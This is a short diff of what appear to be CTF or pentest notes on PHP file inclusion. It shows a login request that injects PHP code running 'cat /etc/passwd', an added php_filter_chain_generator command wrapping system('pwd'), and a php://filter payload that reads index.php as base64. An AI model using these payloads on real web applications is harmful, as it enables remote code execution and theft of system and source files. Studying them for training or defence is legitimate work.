@@ -438,10 +438,14 @@ login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
 >next php filter
 >
 [php chain](https://github.com/synacktiv/php_filter_chain_generator)
->and use benefits for xat index html
+```
+ python php py --chain <?php
+    system('pwd');
+?>
+```
+
+>and use benefits for cat index html
 >
 ```
 php://filter/convert.base64-encode/resource=index.php
 ```
-
-
